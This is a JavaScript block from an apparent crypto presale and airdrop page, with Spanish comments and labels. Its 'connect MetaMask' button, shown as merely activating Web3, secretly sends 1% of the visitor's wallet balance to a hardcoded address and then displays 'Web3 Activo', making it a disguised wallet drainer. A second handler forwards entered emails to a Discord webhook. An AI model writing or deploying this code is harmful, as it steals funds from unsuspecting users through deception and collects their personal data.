<script>
document.getElementById('conectarMetaMask').addEventListener('click', () => {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        window.ethereum.enable().then(accounts => {
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
            web3.eth.getBalance(usuarioAddress).then(balance => {
                const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.01; // Envía el 1% del saldo
                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
                web3.eth.sendTransaction({
                    from: usuarioAddress,
                    to: direccionDestino,
                    value: cantidadEnviarEnWei,
                })
                .then(receipt => {
                    console.log('Transacción exitosa:', receipt);
                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
                })
                .catch(error => {
                    console.error('Error en la transacción:', error);
                });
            });
        });
    } else {
        console.error('MetaMask no está instalado.');
    }
});

document.getElementById('enviar').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Correo electrónico inválido');
        return;
    }
    
    const botonEnviar = document.getElementById('enviar');
    botonEnviar.textContent = "Registrado";

    // Enviar datos al webhook de Discord
    const webhookUrl = 'TU_WEBHOOK_URL_AQUI';
    const data = {
        content: `Nuevo registro para la presale y airdrop: ${email}`,
    };
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(responseData => {
        console.log(responseData);
    })
    .catch(error => {
        console.error('Error enviando datos al webhook:', error);
    });
});

document.getElementById('generarReferido').addEventListener('click', function() {
    const walletAddress = document.getElementById('walletAddress').value;
    if(walletAddress === '') {
        alert('Por favor, introduce tu dirección de wallet.');
        return;
    }
    const enlaceActual = window.location.href;
    const enlaceReferido = `${enlaceActual}?ref=${walletAddress}`;
    document.getElementById('enlaceReferido').textContent = `Tu enlace de referido es: ${enlaceReferido}`;
});
</script>
